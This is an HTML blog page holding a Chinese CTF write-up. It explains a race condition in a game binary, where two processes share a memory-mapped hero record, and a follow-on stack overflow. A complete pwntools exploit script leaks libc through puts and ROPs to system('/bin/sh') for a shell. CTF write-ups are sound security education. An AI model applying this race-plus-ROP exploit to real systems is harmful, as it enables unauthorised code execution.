@@ -1,0 +1,526 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/ha1vk/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/ha1vk/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/ha1vk/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/ha1vk/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/ha1vk/css/main.css">
+
+
+<link rel="stylesheet" href="/ha1vk/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"github.com","root":"/ha1vk/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
+  </script>
+
+  <meta name="description" content="首先，检查一下程序的保护机制，很好   然后，我们用IDA分析，发现一个很明显的栈溢出漏洞   但是，要想执行这个漏洞函数，就必须打赢游戏">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Play(条件竞争,多进程共享同一数据区域)">
+<meta property="og:url" content="https://github.com/ha1vk/2019/12/19/play/index.html">
+<meta property="og:site_name" content="ha1vk&#39;s blog">
+<meta property="og:description" content="首先，检查一下程序的保护机制，很好   然后，我们用IDA分析，发现一个很明显的栈溢出漏洞   但是，要想执行这个漏洞函数，就必须打赢游戏">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://github.com/ha1vk/2019/12/19/play/image1.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2019/12/19/play/image2.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2019/12/19/play/image3.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2019/12/19/play/image4.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2019/12/19/play/image5.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2019/12/19/play/image6.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2019/12/19/play/image7.JPG">
+<meta property="og:image" content="https://github.com/ha1vk/2019/12/19/play/image8.JPG">
+<meta property="article:published_time" content="2019-12-19T07:57:50.000Z">
+<meta property="article:modified_time" content="2025-06-21T11:04:05.744Z">
+<meta property="article:author" content="ha1vk">
+<meta property="article:tag" content="栈溢出">
+<meta property="article:tag" content="ROP">
+<meta property="article:tag" content="条件竞争">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://github.com/ha1vk/2019/12/19/play/image1.JPG">
+
+<link rel="canonical" href="https://github.com/ha1vk/2019/12/19/play/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>Play(条件竞争,多进程共享同一数据区域) | ha1vk's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/ha1vk/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">ha1vk's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/ha1vk/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/ha1vk/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/ha1vk/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/ha1vk/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/ha1vk/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://github.com/ha1vk/2019/12/19/play/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/ha1vk/images/avatar.gif">
+      <meta itemprop="name" content="ha1vk">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ha1vk's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Play(条件竞争,多进程共享同一数据区域)
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2019-12-19 15:57:50" itemprop="dateCreated datePublished" datetime="2019-12-19T15:57:50+08:00">2019-12-19</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-06-21 19:04:05" itemprop="dateModified" datetime="2025-06-21T19:04:05+08:00">2025-06-21</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/ha1vk/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>首先，检查一下程序的保护机制，很好</p>
+<img src="/ha1vk/2019/12/19/play/image1.JPG" class="">
+
+<p>然后，我们用IDA分析，发现一个很明显的栈溢出漏洞</p>
+<img src="/ha1vk/2019/12/19/play/image2.JPG" class="">
+
+<p>但是，要想执行这个漏洞函数，就必须打赢游戏</p>
+<img src="/ha1vk/2019/12/19/play/image3.JPG" class="">
+
+<p>而，要打赢游戏，就是让*(_DWORD *)(gMonster + 8)的值小于等于0，也就是Host的Surplus要小于等于0</p>
+<img src="/ha1vk/2019/12/19/play/image4.JPG" class="">
+
+<p>然后，我们看到这里有一个修改(gMonster + 8)值的地方</p>
+<img src="/ha1vk/2019/12/19/play/image5.JPG" class="">
+
+<p>也就是Host和Hero互相攻击，消减对方的生命值，我们继续分析，发现gHero指向的是一个内存映射出来的区域</p>
+<img src="/ha1vk/2019/12/19/play/image6.JPG" class="">
+
+<p>那么，假如我们同时运行两个该程序的进程，并且**[登录同一个用户名，那么，它们的gHero是同一个内存区域，那么，gHero就叠加了两种技能]{.mark}**，于是就可以打败BOSS。执行漏洞函数，getshell</p>
+<p>我们可以这样</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>	change_skill(io1, <span class="number">3</span>)  </span><br><span class="line"><span class="number">2.</span>	attack(io1)  </span><br><span class="line"><span class="number">3.</span>	change_skill(io2,<span class="number">1</span>)  </span><br><span class="line"><span class="number">4.</span>	use_hide(io1, <span class="number">1</span>)  </span><br></pre></td></tr></table></figure>
+
+<p>如上代码,io1使用技能3,会导致双方的生命值都增加，当我们使用技能3 attack时，<strong>[当出现use hiden_methods?(1:yes&#x2F;0:no)选择时，我们通过io2来改变gHero的技能，使得执行后面的代码时，gHero的生命值增加，gMonster的生命值递减]{.mark}</strong>，这样，我们就能赢得游戏</p>
+<img src="/ha1vk/2019/12/19/play/image7.JPG" class="">
+
+<p>也就是说,在read_int()阻塞io1时，我们通过io2改变了gHero的相关属性，使得后面的代码取得的gHero数据和之前不一致。</p>
+<p>程序使用了类似于虚表的东西来实现不同技能，从不同的地方取数据，感兴趣的同学可以仔细跟踪一下几个技能，分别对应的数据在哪，然后找到让gHero技能递增,gMonster递减的攻击模式。我们上述的是一种攻击方法，可能还会有其他攻击方法。</p>
+<img src="/ha1vk/2019/12/19/play/image8.JPG" class="">
+
+<p>打赢了游戏，就是一个简单的栈溢出漏洞，直接利用即可。</p>
+<p>综上，我们的exp脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>	<span class="comment">#coding:utf8  </span></span><br><span class="line"><span class="number">2.</span>	<span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line"><span class="number">3.</span>	<span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *  </span><br><span class="line"><span class="number">4.</span>	  </span><br><span class="line"><span class="number">5.</span>	debug = <span class="number">1</span>  </span><br><span class="line"><span class="number">6.</span>	  </span><br><span class="line"><span class="number">7.</span>	<span class="keyword">if</span> debug:  </span><br><span class="line"><span class="number">8.</span>	   io1 = process(<span class="string">&#x27;./pwnh38&#x27;</span>)  </span><br><span class="line"><span class="number">9.</span>	   io2 = process(<span class="string">&#x27;./pwnh38&#x27;</span>)  </span><br><span class="line"><span class="number">10.</span>	<span class="keyword">else</span>:  </span><br><span class="line"><span class="number">11.</span>	   addr = <span class="string">&#x27;111.198.29.45&#x27;</span>  </span><br><span class="line"><span class="number">12.</span>	   port = <span class="number">59829</span>  </span><br><span class="line"><span class="number">13.</span>	   io1 = remote(addr,port)  </span><br><span class="line"><span class="number">14.</span>	   io2 = remote(addr,port)  </span><br><span class="line"><span class="number">15.</span>	  </span><br><span class="line"><span class="number">16.</span>	elf = ELF(<span class="string">&#x27;./pwnh38&#x27;</span>)  </span><br><span class="line"><span class="number">17.</span>	puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]  </span><br><span class="line"><span class="number">18.</span>	puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]  </span><br><span class="line"><span class="number">19.</span>	vul_func = elf.sym[<span class="string">&#x27;vul_func&#x27;</span>]  </span><br><span class="line"><span class="number">20.</span>	  </span><br><span class="line"><span class="number">21.</span>	<span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">io, name</span>):  </span><br><span class="line"><span class="number">22.</span>	   io.sendlineafter(<span class="string">&quot;login:&quot;</span>, name)  </span><br><span class="line"><span class="number">23.</span>	  </span><br><span class="line"><span class="number">24.</span>	<span class="keyword">def</span> <span class="title function_">attack</span>(<span class="params">io</span>):  </span><br><span class="line"><span class="number">25.</span>	   io.sendlineafter(<span class="string">&quot;choice&gt;&gt; &quot;</span>,<span class="string">&quot;1&quot;</span>)  </span><br><span class="line"><span class="number">26.</span>	  </span><br><span class="line"><span class="number">27.</span>	<span class="keyword">def</span> <span class="title function_">use_hide</span>(<span class="params">io, choice</span>):  </span><br><span class="line"><span class="number">28.</span>	   io.sendlineafter(<span class="string">&quot;(1:yes/0:no):&quot;</span>,<span class="built_in">str</span>(choice))  </span><br><span class="line"><span class="number">29.</span>	  </span><br><span class="line"><span class="number">30.</span>	<span class="keyword">def</span> <span class="title function_">change_skill</span>(<span class="params">io, choice</span>):  </span><br><span class="line"><span class="number">31.</span>	   io.sendlineafter(<span class="string">&quot;choice&gt;&gt; &quot;</span>,<span class="string">&quot;3&quot;</span>)  </span><br><span class="line"><span class="number">32.</span>	   io.sendlineafter(<span class="string">&quot;choice&gt;&gt; &quot;</span>, <span class="built_in">str</span>(choice))  </span><br><span class="line"><span class="number">33.</span>	  </span><br><span class="line"><span class="number">34.</span>	<span class="keyword">def</span> <span class="title function_">god_attack</span>(<span class="params">io1, io2</span>):  </span><br><span class="line"><span class="number">35.</span>	   change_skill(io1, <span class="number">3</span>)  </span><br><span class="line"><span class="number">36.</span>	   attack(io1)  </span><br><span class="line"><span class="number">37.</span>	   change_skill(io2,<span class="number">1</span>)  </span><br><span class="line"><span class="number">38.</span>	   use_hide(io1, <span class="number">1</span>)  </span><br><span class="line"><span class="number">39.</span>	<span class="keyword">def</span> <span class="title function_">pwn</span>(<span class="params">io1, io2</span>):  </span><br><span class="line"><span class="number">40.</span>	    login(io1, <span class="string">&quot;test\n&quot;</span>)  </span><br><span class="line"><span class="number">41.</span>	    login(io2, <span class="string">&quot;test\n&quot;</span>)  </span><br><span class="line"><span class="number">42.</span>	    <span class="keyword">while</span> <span class="literal">True</span>:  </span><br><span class="line"><span class="number">43.</span>	        god_attack(io1, io2)  </span><br><span class="line"><span class="number">44.</span>	        data = io1.recvuntil(<span class="string">&quot;\n&quot;</span>)  </span><br><span class="line"><span class="number">45.</span>	        <span class="keyword">if</span> <span class="string">&quot;you win&quot;</span> <span class="keyword">in</span> data:  </span><br><span class="line"><span class="number">46.</span>	            data = io1.recvuntil(<span class="string">&quot;\n&quot;</span>)  </span><br><span class="line"><span class="number">47.</span>	            <span class="keyword">if</span> <span class="string">&quot;remember you forever!&quot;</span> <span class="keyword">in</span> data:  </span><br><span class="line"><span class="number">48.</span>	                <span class="keyword">break</span>  </span><br><span class="line"><span class="number">49.</span>	    <span class="comment">#泄露puts的地址  </span></span><br><span class="line"><span class="number">50.</span>	    payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x4C</span> + p32(puts_plt) + p32(vul_func) + p32(puts_got)  </span><br><span class="line"><span class="number">51.</span>	    io1.sendlineafter(<span class="string">&#x27;name:&#x27;</span>,payload)  </span><br><span class="line"><span class="number">52.</span>	    io1.recvuntil(<span class="string">&#x27;\n&#x27;</span>)  </span><br><span class="line"><span class="number">53.</span>	    puts_addr = u32(io1.recv(<span class="number">4</span>))  </span><br><span class="line"><span class="number">54.</span>	    <span class="comment">#查询数据库，得到libc的信息  </span></span><br><span class="line"><span class="number">55.</span>	    libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)  </span><br><span class="line"><span class="number">56.</span>	    <span class="comment">#获得libc基址  </span></span><br><span class="line"><span class="number">57.</span>	    libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)  </span><br><span class="line"><span class="number">58.</span>	    system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)  </span><br><span class="line"><span class="number">59.</span>	    binsh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)  </span><br><span class="line"><span class="number">60.</span>	    <span class="comment">#getshell  </span></span><br><span class="line"><span class="number">61.</span>	    payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x4C</span> + p32(system_addr) + p32(<span class="number">0</span>) + p32(binsh_addr)  </span><br><span class="line"><span class="number">62.</span>	    io1.sendlineafter(<span class="string">&#x27;name:&#x27;</span>,payload)  </span><br><span class="line"><span class="number">63.</span>	  </span><br><span class="line"><span class="number">64.</span>	pwn(io1, io2)  </span><br><span class="line"><span class="number">65.</span>	io1.interactive()  </span><br><span class="line"><span class="number">66.</span>	<span class="comment">#io2.interactive()  </span></span><br></pre></td></tr></table></figure>
+
+<p>本题告诉我们，<strong>[对于程序中使用文件时，应该加类似于锁的东西，使得当前程序获得文件的所有权后，其他的不能在那个程序运行期间获得文件的所有权。]{.mark}</strong></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/ha1vk/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/" rel="tag"># 栈溢出</a>
+              <a href="/ha1vk/tags/ROP/" rel="tag"># ROP</a>
+              <a href="/ha1vk/tags/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/" rel="tag"># 条件竞争</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/ha1vk/2019/12/12/calc2_calc/" rel="prev" title="calc2">
+      <i class="fa fa-chevron-left"></i> calc2
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/ha1vk/2019/12/20/NoBug/" rel="next" title="Nobug">
+      Nobug <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">ha1vk</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/ha1vk/archives/">
+        
+          <span class="site-state-item-count">233</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/ha1vk/categories/">
+          
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/ha1vk/tags/">
+          
+        <span class="site-state-item-count">145</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ha1vk</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/ha1vk/lib/anime.min.js"></script>
+  <script src="/ha1vk/lib/velocity/velocity.min.js"></script>
+  <script src="/ha1vk/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/ha1vk/js/utils.js"></script>
+
+<script src="/ha1vk/js/motion.js"></script>
+
+
+<script src="/ha1vk/js/schemes/muse.js"></script>
+
+
+<script src="/ha1vk/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/ha1vk/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
